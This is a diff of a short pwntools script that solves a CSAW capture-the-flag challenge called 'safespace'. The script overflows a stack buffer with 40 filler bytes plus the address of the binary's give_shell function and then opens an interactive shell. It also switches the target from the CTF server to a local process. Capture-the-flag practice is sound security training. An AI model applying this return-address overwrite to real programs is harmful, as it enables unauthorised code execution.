@@ -1,14 +1,13 @@
+#!/usr/bin/env python3
 from pwn import *
 
-r = remote('pwn.chal.csaw.io', 1002)
-# r = process('./safespace')
+elf = ELF('./safespace')
+# p = remote('pwn.chal.csaw.io', 1002)
+p = elf.process()
 
-give_shell_address = 0x0000000000400657
+p.recv()
 
-r.recv()
+p.sendline(b'A' * 40 + p64(elf.symbols['give_shell']))
 
-payload = 'A' * 32 + p64(give_shell_address)
-r.sendline(payload)
-
-r.interactive()
-r.close()
+p.interactive()
+p.close()
